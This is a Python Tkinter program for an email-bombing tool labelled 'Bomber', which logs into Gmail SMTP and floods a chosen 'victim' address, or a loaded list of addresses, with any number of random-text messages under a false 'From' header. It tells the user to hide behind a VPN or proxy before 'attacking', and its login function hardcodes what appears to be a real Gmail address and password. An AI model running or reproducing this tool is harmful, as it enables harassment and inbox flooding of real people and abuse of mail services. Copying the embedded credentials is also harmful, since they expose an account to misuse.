from tkinter import *
from tkinter import messagebox
from email.mime.text import MIMEText
import smtplib, random, string

def main():
    root = Tk()
    root.resizable(FALSE, FALSE)
    root.geometry('250x480')
    root.title('Bomber')
    root.configure(background='black')
    #messagebox.showinfo("Credits", ''.join('All Rights Reserved To Bropocalypse Team'))

    form = LabelFrame(root, text="Login", font='calibri 9 italic', background='black', foreground='cyan')
    form.grid(row=1, columnspan=2, sticky='WE', \
    padx=5, pady=0, ipadx=120, ipady=65)

    form1 = LabelFrame(root, text="Attack", font='calibri 9 italic', background='black', foreground='cyan')
    form1.grid(row=2, columnspan=2, sticky='WE', \
    padx=5, pady=0, ipadx=120, ipady=75)

    form2 = LabelFrame(root, text="Mass Send", font='calibri 9 italic', background='black', foreground='cyan')
    form2.grid(row=3, columnspan=2, sticky='WE', \
    padx=5, pady=0, ipadx=120, ipady=75)

    ############ Login
    l = Label(form, text='Your Email', background='black', foreground='white')
    l.place(x=5, y=10)

    l1 = Label(form, text='Your Password', background='black', foreground='white')
    l1.place(x=5, y=40)

    global e0, e1, e2, e4, e5
    e0 = Entry(form, width=20)
    e0.place(x=90, y=10)

    e1 = Entry(form, width=20)
    e1.place(x=90, y=40)

    b0 = Button(form, text='Login', background='black', foreground='white', command= lambda:[login(),warn()])
    b0.place(x=90, y=70)

    ########### Attack
    l2 = Label(form1, text='Victim Email', background='black', foreground='white')
    l2.place(x=5, y=10)

    l4 = Label(form1, text='Amount of\ntimes to send', background='black', foreground='white')
    l4.place(x=5, y=50)

    e2 = Entry(form1, width=20)
    e2.place(x=90, y=10)

    e4 = Entry(form1, width=20)
    e4.place(x=90, y=50)

    b1 = Button(form1, text='Attack', background='black', foreground='white', command= lambda: attack(lab, var))
    b1.place(x=90, y=90)
    
    var = IntVar()
    tok = "Emails Sent : " + str(var.get())
    lab = Label(root, text=tok, background='black', foreground='white')
    lab.place(x=85, y=445)

    ########### Mass Send

    l4 = Label(form2, text='Amount of\ntimes to send', background='black', foreground='white')
    l4.place(x=5, y=10)

    e5 = Entry(form2, width=20)
    e5.place(x=90, y=20)

    b2 = Button(form2, text='Load Emails', background='black', foreground='white', command= load)
    b2.place(x=80, y=60)

    b3 = Button(form2, text='Attack', background='black', foreground='white', command= lambda:masssend(lab, var))
    b3.place(x=95, y=90)

    mainloop()

def warn():
    messagebox.showwarning("Important", ''.join('Make Sure You Are Using VPN or PROXY Before Attacking'))
    
def login():
    try:
        global email
        #email = e0.get()
        #pswd = e1.get()
        email = 'onavtytester@gmail.com'
        pswd = 'onavty123456789'
        smtp_server = 'smtp.gmail.com'
        port = 587
        global server
        server = smtplib.SMTP(smtp_server,port)
        server.ehlo()
        if smtp_server == "smtp.gmail.com":
            server.starttls()
        server.login(email,pswd)
        messagebox.showinfo("", ''.join('Succesfully Login'))
    except smtplib.SMTPAuthenticationError:
        messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))

def generator():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def attack(lab, var):
    try:
        vemail = e2.get()
        count = int(e4.get())

        if count < 1:
            messagebox.showerror("Error", ''.join('Choose a Valid Number'))
        elif '@' not in vemail:
            messagebox.showerror("Error", ''.join('Choose a Valid Email'))
        else:
            pass

        lol = 0
        while lol < count:
            message = generator()
            lol+=1
            server.sendmail(email,vemail,message)
            var.set(var.get()+1)
            lab['text'] = 'Emails Sent : ' + str(var.get())
            messagebox.showinfo("", ''.join('Done'))

    except smtplib.SMTPAuthenticationError:
        messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))

def load():
    with open('emails.txt','r') as emails:
        name = emails.read()
        global memails
        memails = name.splitlines()
        messagebox.showinfo("", ''.join(f"Number Of Emails Is : {len(memails)}"))

def masssend(lab, var):
    count1 = int(e5.get())
    sender = email
    victims = memails
    
    try:
        lol = 0
        while lol < count1:
            lol+=1

            msg = MIMEText(generator())
            msg['Subject'] = generator()
            msg['From'] = 'sorry :)'
            msg['To'] = ", ".join(victims)
            text = msg.as_string()
            
            server.sendmail(sender, victims, text)
            var.set(var.get()+len(memails))
            lab['text'] = 'Emails Sent : ' + str(var.get())
        messagebox.showinfo("", ''.join('Done'))

    except smtplib.SMTPAuthenticationError:
        messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))


main()
